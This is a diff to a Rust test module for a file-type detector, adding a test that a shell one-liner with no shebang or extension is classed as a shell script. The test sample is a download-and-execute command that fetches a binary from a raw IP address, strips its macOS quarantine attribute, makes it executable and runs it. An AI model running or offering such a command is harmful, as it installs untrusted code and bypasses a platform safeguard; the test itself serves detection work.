@@ -593,6 +593,15 @@ mod tests {
     }
 
     #[test]
+    fn shell_one_liner_without_shebang_or_ext() {
+        assert_detect(
+            "Sifuvuziw",
+            b"cd $TMPDIR && curl -O http://144.31.236.51/Dynamic && xattr -c ./Dynamic && chmod +x ./Dynamic && ./Dynamic\n",
+            FileType::Shell,
+        );
+    }
+
+    #[test]
     fn shell_empty_falls_back_to_ext() {
         let det = detect(Path::new("run.sh"), b"").unwrap();
         assert_eq!(det.file_type, FileType::Shell);
